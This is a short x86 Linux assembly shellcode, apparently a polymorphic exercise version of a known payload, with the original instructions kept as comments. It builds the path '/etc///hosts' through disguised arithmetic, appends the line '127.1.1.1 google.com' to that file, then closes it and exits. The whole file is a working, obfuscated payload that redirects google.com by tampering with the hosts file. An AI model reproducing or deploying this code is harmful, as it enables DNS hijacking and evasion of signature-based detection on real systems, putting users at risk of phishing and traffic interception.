
global _start

section .text
_start:
   	sub ecx, ecx		;zero out ecx
    	mul ecx			;zero out eax, edx
    	;mov al, 0x5
	inc eax			;eax=1
	shl eax, 2		;eax = 1 * 4 = 4
	inc eax			;eax = 5
	mov esi, eax		;esi will be 5
    	push ecx
    	;push 0x7374736f     	;/etc///hosts
    	;push 0x682f2f2f
        ;push 0x6374652f
	mov edx, 0x7374736f
	push edx
	sub edx, 0x0b454440
	push edx
	sub edx, 0x04baca01
	inc edx
	push edx
	lea ebx, [esp]
	or cx, 0x401
	int 0x80

	xchg eax, ebx		;store return value (fd) into ebx
	
	;push 0x4
	;pop eax
	dec esi			;esi=5-1=4
	mov eax, esi		;mov 4 into eax
	jmp short _load_data

_write:
	;pop ecx
	mov ecx, dword [esp]
	add esp, 4
	
	;push 20
	;pop edx
	shl esi, 2		;esi=4*4=16
	add esi, 4		;esi=16+4=20
	lea edx, [esi]
	
	int 0x80

	;push 0x6
	;pop eax
	shr esi, 2		;esi=20/4=5
	inc esi			;esi=6
	lea eax, [esi]
	int 0x80

	;push 0x1
	;pop eax
	sub eax, eax
	inc eax
	int 0x80

_load_data:
    call _write
    google: db "127.1.1.1 google.com"

